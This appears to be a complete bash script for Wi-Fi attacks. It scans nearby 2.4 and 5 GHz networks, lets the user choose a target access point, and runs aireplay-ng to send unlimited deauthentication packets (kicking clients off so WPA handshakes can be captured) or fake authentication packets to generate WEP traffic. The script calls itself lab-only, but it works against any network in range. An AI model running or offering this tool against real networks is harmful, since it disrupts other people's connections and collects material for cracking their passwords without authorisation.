#!/usr/bin/env bash
# wireless_scan_capture.sh
# Last Edited by Charles Duoto on November 16, 2026
# Interactive dual-band scanner + targeted capture + optional deauth/fakeauth.
# Pure bash. Requires monitor mode already enabled.
# Authorized lab environments only.
#
# Usage:
#   sudo ./wireless_scan_capture.sh wlan0

set -euo pipefail

if [[ $# -ne 1 ]]; then
    echo "Usage: $0 <monitor_interface>"
    echo "Example: $0 wlan0"
    exit 1
fi

IFACE="$1"
SCAN_DIR="/tmp/haxvibez_scan_$$"
mkdir -p "$SCAN_DIR"
SCAN_PREFIX="$SCAN_DIR/scan"

cleanup() {
    # Kill any leftover airodump if still running
    if [[ -n "${DUMP_PID:-}" ]] && kill -0 "$DUMP_PID" 2>/dev/null; then
        kill "$DUMP_PID" 2>/dev/null || true
        wait "$DUMP_PID" 2>/dev/null || true
    fi
    rm -rf "$SCAN_DIR" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

echo "[*] Scanning both 2.4 GHz and 5 GHz on $IFACE for 15 seconds..."
echo "[*] Press Ctrl+C to stop early."

# Run airodump in background so we can time it and still catch Ctrl+C
airodump-ng --band abg --write "$SCAN_PREFIX" --output-format csv "$IFACE" >/dev/null 2>&1 &
DUMP_PID=$!

# Allow early exit with Ctrl+C
sleep 15 || true

# Cleanly stop airodump so it flushes the CSV
if kill -0 "$DUMP_PID" 2>/dev/null; then
    kill "$DUMP_PID" 2>/dev/null || true
    wait "$DUMP_PID" 2>/dev/null || true
fi
DUMP_PID=""

CSV="$SCAN_PREFIX-01.csv"
if [[ ! -f "$CSV" ]]; then
    echo "[-] No scan results written. Is $IFACE in monitor mode and seeing networks?"
    exit 1
fi

echo
echo "=== Nearby Networks ==="
# Parse APs from airodump CSV (stops at the client section)
mapfile -t NETWORKS < <(awk -F, '
    /^BSSID/ { next }
    /^Station MAC/ { exit }
    NF > 13 && $1 ~ /^([0-9A-Fa-f]{2}:){5}/ {
        gsub(/ /, "", $1); gsub(/ /, "", $4); gsub(/ /, "", $6); gsub(/ /, "", $14)
        printf "%s|%s|%s|%s\n", $1, $4, $6, $14
    }
' "$CSV")

if [[ ${#NETWORKS[@]} -eq 0 ]]; then
    echo "[-] No networks found in scan."
    exit 1
fi

i=1
for net in "${NETWORKS[@]}"; do
    IFS='|' read -r bssid ch enc essid <<< "$net"
    printf "%2d) %-17s  CH:%-3s  %-8s  %s\n" "$i" "$bssid" "$ch" "$enc" "$essid"
    ((i++))
done

echo
read -rp "Select network number (or q to quit): " CHOICE
if [[ "$CHOICE" == "q" || -z "$CHOICE" ]]; then
    echo "[*] Exiting."
    exit 0
fi

if ! [[ "$CHOICE" =~ ^[0-9]+$ ]] || (( CHOICE < 1 || CHOICE > ${#NETWORKS[@]} )); then
    echo "[-] Invalid selection."
    exit 1
fi

SELECTED="${NETWORKS[$((CHOICE-1))]}"
IFS='|' read -r BSSID CHANNEL ENC ESSID <<< "$SELECTED"

echo
echo "[*] Selected: $BSSID ($ESSID) on channel $CHANNEL"
echo "1) Targeted packet capture only"
echo "2) Targeted capture + deauth (lab handshake collection)"
echo "3) Targeted capture + fake auth (generate traffic for WEP)"
read -rp "Choice [1/2/3]: " ACTION

CAP_PREFIX="${PWD}/capture_${BSSID//:/}"
echo "[*] Writing capture to ${CAP_PREFIX}-01.cap"

# Get the MAC of our interface for fakeauth
OUR_MAC=$(ip link show "$IFACE" | grep -oP '(?<=link/ether )[^ ]+' || ifconfig "$IFACE" | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1)

if [[ "$ACTION" == "2" ]]; then
    echo "[*] Starting targeted capture in background..."
    airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$CAP_PREFIX" "$IFACE" >/dev/null 2>&1 &
    DUMP_PID=$!
    sleep 3
    echo "[*] Sending deauth packets (Ctrl+C to stop)..."
    echo "[!] Lab use only. This will disconnect clients from the selected AP."
    aireplay-ng --deauth 0 -a "$BSSID" "$IFACE" || true
    kill "$DUMP_PID" 2>/dev/null || true
    wait "$DUMP_PID" 2>/dev/null || true
elif [[ "$ACTION" == "3" ]]; then
    if [[ -z "$OUR_MAC" ]]; then
        echo "[-] Could not determine MAC of $IFACE"
        exit 1
    fi
    echo "[*] Starting targeted capture in background..."
    airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$CAP_PREFIX" "$IFACE" >/dev/null 2>&1 &
    DUMP_PID=$!
    sleep 3
    echo "[*] Sending fake auth packets with $OUR_MAC (Ctrl+C to stop)..."
    echo "[!] Lab use only. Useful for generating traffic on quiet WEP networks."
    aireplay-ng --fakeauth 0 -a "$BSSID" -h "$OUR_MAC" "$IFACE" || true
    kill "$DUMP_PID" 2>/dev/null || true
    wait "$DUMP_PID" 2>/dev/null || true
else
    echo "[*] Starting targeted capture (Ctrl+C to stop)..."
    airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$CAP_PREFIX" "$IFACE"
fi

echo "[+] Capture finished. File: ${CAP_PREFIX}-01.cap"
